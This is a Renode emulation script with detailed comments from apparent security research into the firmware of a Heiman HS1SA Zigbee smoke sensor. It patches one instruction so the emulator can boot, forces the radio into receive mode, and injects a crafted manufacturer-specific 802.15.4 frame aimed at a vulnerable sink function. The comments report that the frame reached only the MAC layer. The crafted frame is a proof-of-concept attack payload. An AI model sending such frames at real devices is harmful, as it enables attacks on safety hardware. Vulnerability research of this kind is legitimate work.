:name: ZB-06 HS1SA — OTA reachability with RX opened (emulation-stabilized boot)
:description: Boots the Heiman HS1SA (EFR32MG21) firmware past a Renode Cortex-M33 instruction-decode gap, lets the firmware's own MAC bring the radio up to RxSearch, then injects a real 802.15.4 mfg-0x120B/0xF3 frame and traces how far it propagates toward the vulnerable sink sub_1662e.
#
# ============================ FORCED vs NATURAL ============================
# NATURAL (firmware's own behaviour, observed in the radio RSM log):
#   * The un-commissioned firmware itself brings the radio up and enters
#     RxSearch periodically for network/energy scan:
#         Off -> RxWarm -> RxSearch -> RxPoweringDown -> Off   (~every 25 ms)
#     i.e. RX opening is gated by the MAC SCAN, NOT by network==JOINED state.
#     The prior "radio never leaves Off / Dropping (not in RXSEARCH)" result
#     was purely a BOOT-CRASH artifact (see PATCH #1 below), not a commissioning
#     gate.
#   * On the injected frame the firmware's MAC ISR runs and drives the RSM
#         RxSearch -> RxFrame (FrameDetected) -> Rx2Tx (MAC ACK) -> TxPoweringDown
#     => the received frame reaches the firmware's PHY/FRC/MAC layer for real.
#
# FORCED (emulation scaffolding, clearly not firmware behaviour):
#   * PATCH #1 @0x266A4: the firmware contains ONE 32-bit `MOV.W R0, SP`
#     (encoding EA4F 000D, T3 with Rm=SP -- UNPREDICTABLE per the ARM ARM).
#     Renode's Cortex-M33 (tlib) rejects it as UNDEFINSTR (CFSR.UNDEFINSTR),
#     the firmware's fault handler (@0x2882C) dumps context and SYSRESETREQs,
#     producing an endless ~15-27 ms reset loop that NEVER completes radio
#     bring-up. We rewrite it to the equivalent 16-bit `MOV R0, SP` (0x4668)
#     + NOP. This is a pure emulator-fidelity fix; real HW executes EA4F000D.
#   * SWRXEN + FORCESTATE poke: to hold the radio in RxSearch deterministically
#     for the injection (the natural RxSearch windows are sub-100us and hard to
#     hit from the monitor) we set RAC.RXENSourceEnable.SWRXEN=1 (0xA8020008)
#     and RAC.FORCESTATE=RxSearch (0xA8020018=2). RX-OPENING itself is natural
#     (see above); only the *timing/hold* of the window is forced.
#
# ============================ RESULT / VERDICT ============================
#   PHY  : frame accepted (sync 0xA7 matches, not dropped)            REACHED
#   FRC  : RXDONE raised, FrameControllerIRQ -> nvic@34               REACHED
#   MAC  : firmware ISR runs, ACKs frame (RxFrame->Rx2Tx)             REACHED
#   NWK/APS/ZCL dispatch (sub_1CC4E -> sub_C22C -> ... -> sub_1662e)  NOT REACHED
#
#   The ZCL chain is NOT reached, for two compounding reasons:
#     (a) the device is UN-COMMISSIONED (no NVM3/token storage in this ELF, no
#         network key/parent) so the NWK/APS layer discards the frame before ZCL
#         dispatch -- the documented exploitability boundary (attacker needs the
#         network key); AND
#     (b) NWK/APS/ZCL dispatch is DEFERRED to the stack main-loop tick, which
#         this emulation cannot sustain: after PATCH #1 the next fault is a call
#         through the absent Gecko bootloader vector table (r4=0x28, *0x28=0 ->
#         `BX 0` -> CFSR.INVSTATE @0x2AD46) which resets the chip ~every 27 ms,
#         and skipping it hits an assert-trap (UDF #0x42 @0x77BC). Full stack
#         stability would require emulating the Secure Element mailbox
#         (0x40094000-0x40096000) and providing the bootloader image.
#
#   => End-to-end OTA reachability of sub_1662e is PARTIAL in this emulation:
#      proven up to and including the firmware's MAC receive path from a REAL
#      injected frame; blocked above the MAC at NWK/APS (no network membership)
#      and by boot instability (missing bootloader/SE). No PC was forced to
#      reach any chain node.
# ==========================================================================

using sysbus
emulation SetGlobalSerialExecution true
emulation CreateIEEE802_15_4Medium "wireless"
mach create "hs1sa"
machine LoadPlatformDescription @platforms/boards/silabs/brd4180a.repl
$bin?=@scripts/silabs-vuln/hs1sa.elf
macro reset
"""
    sysbus LoadELF $bin
    cpu VectorTableOffset 0x6000
    sysbus WriteWord 0x266A4 0x4668
    sysbus WriteWord 0x266A6 0xBF00
"""
runMacro $reset
connector Connect sysbus.radio wireless
logLevel 1 sysbus.radio

# Chain-node markers (fire only if the frame propagates into the ZCL chain).
cpu AddHook 0x1CC4E "self.ErrorLog('CHAIN_ROOT_1CC4E')"
cpu AddHook 0xC22C  "self.ErrorLog('NODE1_C22C')"
cpu AddHook 0xE376  "self.ErrorLog('NODE2_E376')"
cpu AddHook 0x7D46  "self.ErrorLog('NODE3_7D46')"
cpu AddHook 0x7B5A  "self.ErrorLog('NODE4_7B5A')"
cpu AddHook 0xA33C  "self.ErrorLog('NODE5_A33C_GATE')"
cpu AddHook 0x1662E "self.ErrorLog('NODE6_1662E_SINK')"
# Boot-fault / reset marker (missing bootloader vector call, see header).
cpu AddHook 0x2882C "self.ErrorLog('BOOTFAULT_RESET')"

# Let the firmware run: it configures the radio and enters RxSearch naturally
# for scan (visible in the RSM log) before the ~28 ms bootloader-fault reset.
emulation RunFor "0.033"
pause

echo ">>> RAC STATUS before force (bits24-27 = STATE):"
sysbus ReadDoubleWord 0xA802000C
echo ">>> force RX open: SWRXEN=1 (0xA8020008), FORCESTATE=RxSearch (0xA8020018=2)"
sysbus WriteDoubleWord 0xA8020008 0x1
sysbus WriteDoubleWord 0xA8020018 0x2
echo ">>> RAC STATUS after force (expect 0x8_00000_2 -> STATE=RxSearch, RXENS=1):"
sysbus ReadDoubleWord 0xA802000C

echo ">>> INJECT crafted mfg-0x120B / cmdId-0xF3 802.15.4 frame:"
sysbus.radio ReceiveFrame [0xA7,0x00,0x00,0x00,0x61,0x88,0x42,0x34,0x12,0x00,0x00,0x22,0x11,0x48,0x02,0x00,0x00,0x22,0x11,0x1E,0x55,0x40,0x01,0x00,0xFC,0x04,0x01,0x01,0x77,0x05,0x0B,0x12,0x42,0xF3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x41,0x41,0x41,0x6E,0x01,0x20,0x00,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00] sysbus.radio

start
emulation RunFor "0.02"
pause
echo ">>> post-inject PC:"
cpu PC
echo ">>> (see radio log: RxSearch->RxFrame + 'Received ...' = MAC reached; look for NODE* markers above = ZCL chain, expected ABSENT)"
